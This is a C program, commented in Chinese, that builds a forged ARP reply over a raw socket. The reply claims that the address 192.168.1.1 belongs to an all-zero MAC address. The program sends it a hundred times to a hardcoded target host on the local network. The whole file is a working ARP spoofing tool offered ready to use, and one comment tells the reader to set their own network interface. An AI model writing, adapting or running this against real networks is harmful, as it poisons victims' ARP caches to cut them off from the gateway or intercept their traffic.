#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <memory.h>
#include <net/ethernet.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <string.h>

//int 4字节
//shor 2字节
//char 1字节
struct ARP_header
{
    unsigned short    Hardware ;
    unsigned short    Protocol ;
    unsigned char    HardwareAddressLen ;
    unsigned char    ProtocolAddressLeng ;
    unsigned short    Operation ;
    unsigned char    SourceHardareAddr[6] ;
    unsigned char    SourceProtocolAddr[4] ;
    unsigned char    TargetHardareAddr[6] ;
    unsigned char    TargetProtocolAddr[4] ;
};

int main( int argc, char * argv[]) {
    //网卡名字， 这个要改成你自己计算机的网卡名
    unsigned char NetInterface[16] = "eth0";
    struct ARP_header arp_sp;
    arp_sp.Hardware = htons(1);
    arp_sp.Protocol = htons(2048);
    arp_sp.HardwareAddressLen = 6;
    arp_sp.ProtocolAddressLeng = 4;
    arp_sp.Operation = htons(2);

    unsigned char EthernetFrame[64] = {0};
    bzero(EthernetFrame, 64);
    //假数据， 发送伪造的IP地址和MAC
    unsigned char Spoofing_MAC[6] = {0};
    unsigned char Spoofing_IP[4] = {192&0Xff,168&0Xff,1&0Xff,1&0XFF};
    //目标的地址和目标的MAC
    unsigned char Target_MAC[6] = { 0Xd0, 0X7e, 0X35, 0X0a, 0Xef, 0Xd3};
    unsigned char Target_IP[4] = {192&0Xff,168&0Xff,1&0Xff,109&0Xff};
    //本机的IP地址和MAC地址
    unsigned char Source_MAC[6] = {0Xe0,0Xac,0Xcb,0X86,0Xfb,0X1e};
    unsigned char Source_IP[4] = {192&0Xff,168&0Xff,1&0Xff,103&0Xff};
    //ARP内容
    memcpy(arp_sp.SourceHardareAddr, Spoofing_MAC, sizeof(char)*6);
    memcpy(arp_sp.SourceProtocolAddr, Spoofing_IP, sizeof(char)*4);
    memcpy(arp_sp.TargetHardareAddr, Target_MAC, sizeof(char)*6);
    memcpy(arp_sp.TargetProtocolAddr, Target_IP, sizeof(char)*4);
    //以太网头部
    memcpy(EthernetFrame, Target_MAC, sizeof(char)*6);
    memcpy(EthernetFrame+6, Source_MAC, sizeof(char)*6);
    EthernetFrame[12] = ETH_P_ARP / 256;
    EthernetFrame[13] = ETH_P_ARP % 256;
    //以太网头部和ARP数据连接起来
    memcpy(EthernetFrame+14, &arp_sp, sizeof(char)*28);

    int ARPSocket;
    printf("Create Raw Socket");
    ARPSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if( ARPSocket < 0 ) {
        perror("socket failed");
        exit(1);
    }
    //获取设备
    struct sockaddr_ll device;
    device.sll_ifindex = if_nametoindex((const char*)NetInterface);
    if( device.sll_ifindex == 0 ) {
        perror("sockaddr_ll error");
        exit(1);
    }
    printf("Index of interface %s is %d",NetInterface, device.sll_ifindex);
    device.sll_halen = htons(6);
    device.sll_family = AF_PACKET;
    int i = 0;
    //连续发送100次
    for( i; i<100; i++) {
        int sFd = sendto(ARPSocket, EthernetFrame, 42, 0, (struct sockaddr*)&device, sizeof(device));
        if( sFd <=0 ) {
            perror("sendto failed");
            exit(1);
        }
        sleep(1);
    }

    close(ARPSocket);
}